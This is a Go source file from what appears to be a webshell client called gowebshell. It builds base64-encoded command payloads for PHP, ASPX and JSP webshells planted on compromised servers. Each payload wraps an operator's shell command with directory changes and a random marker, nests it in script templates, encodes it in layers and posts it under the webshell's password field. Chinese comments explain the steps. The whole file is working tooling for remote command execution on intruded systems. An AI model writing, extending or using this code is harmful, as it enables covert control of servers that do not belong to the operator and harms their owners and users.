package gowebshell

import (
	"encoding/base64"
	"fmt"
	"github.com/zyylhn/gowebshell/template"
	"github.com/zyylhn/gowebshell/utils"
	"io"
	"strings"
)

type Command struct {
	Pwd           	string               `json:"pwd"`
	Cmd           	string               `json:"cmd"`
	Result        	string               `json:"result"`
	Bash          	string               `json:"bash"`
}

func getCmdResulrFromBody(body string) (string,string) {
	body=strings.ReplaceAll(body,"\r","")
	b:=strings.Split(body,"\n")
	return strings.Join(b[:len(b)-3],"\n"),strings.Join(b[len(b)-3:len(b)-2],"")
}


type Cmd interface {
	GetCmdBody(cmd *Command,webshell *Webshell,random string) io.Reader
}

func getCommand(cmd *Command,random string) string {
	var cmdstr string
	if strings.HasPrefix(cmd.Pwd,"/"){
		cmdstr=fmt.Sprintf("cd \"%v\";%v;pwd;echo %v",cmd.Pwd,cmd.Cmd,random)
	}else {
		cmdstr=fmt.Sprintf("cd /d \"%v\"&%v&cd&echo %v",cmd.Pwd,cmd.Cmd,random)
	}
	//将命令进行base64编码
	cmdbase64:=base64.StdEncoding.EncodeToString([]byte(cmdstr))
	return cmdbase64
}

type PhpCmd struct {}

func (p *PhpCmd) GetCmdBody(cmd *Command,webshell *Webshell,random string) io.Reader {
	var script string
	//获取base64编码过的命令
	cmdbase64:=getCommand(cmd,random)
	//将命base64命令嵌入执行脚本中
	cmdstring:=fmt.Sprintf(template.PhpTerminal,base64.StdEncoding.EncodeToString([]byte(cmd.Bash)),cmdbase64)
	//将执行脚本嵌入php模版中
	script =fmt.Sprintf(template.PhpTmp,random,cmdstring)
	//将整体进行编码
	script =base64.StdEncoding.EncodeToString([]byte(script))
	return utils.GetIoBody(map[string]string{webshell.Password:script})
}

type AspxCmd struct {}

func (a *AspxCmd) GetCmdBody(cmd *Command,webshell *Webshell,random string) io.Reader {
	var script string
	//获取base64编码过的命令
	cmdbase64:=getCommand(cmd,random)
	//将命令嵌入到命令执行脚本中
	cmdstring:=fmt.Sprintf(template.AspxTerminal,base64.StdEncoding.EncodeToString([]byte(cmd.Bash)),cmdbase64)
	//将执行命令的脚本进行编码
	cmdstring=base64.StdEncoding.EncodeToString([]byte(cmdstring))
	//将执行脚本命令嵌入到aspx的执行模版中
	script=fmt.Sprintf(template.AspxTmp,random,cmdstring)
	//整体进行编码
	script =base64.StdEncoding.EncodeToString([]byte(script))
	return utils.GetIoBody(map[string]string{webshell.Password:script})
}

type JspCmd struct {}

func (j *JspCmd) GetCmdBody(cmd *Command,webshell *Webshell,random string) io.Reader {
	var script string
	cmdbase64:=getCommand(cmd,random)
	script=template.GetJspCode(template.JspTerminal, map[string]string{"legowebshellrandom":random,"legowebshellbash":base64.StdEncoding.EncodeToString([]byte(cmd.Bash)),"legowebshellcmd":cmdbase64})
	return utils.GetIoBody(map[string]string{webshell.Password:script})
}
